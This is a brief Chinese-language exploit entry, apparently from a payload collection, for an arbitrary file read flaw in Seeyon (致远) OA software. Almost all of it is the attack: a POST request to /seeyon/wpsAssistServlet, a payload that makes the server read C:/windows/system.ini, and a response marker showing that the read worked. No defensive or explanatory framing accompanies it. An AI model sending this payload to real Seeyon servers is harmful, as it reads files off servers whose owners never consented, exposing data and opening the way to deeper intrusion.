# 致远OA任意文件读取漏洞

致远OA ｜ 任意文件读取/写入 ｜ —
- **请求**：`POST /seeyon/wpsAssistServlet HTTP/1.1`

**Payload**
```
flag=template&templateUrl=C:/windows/system.ini
```
- **响应特征**：200 drivers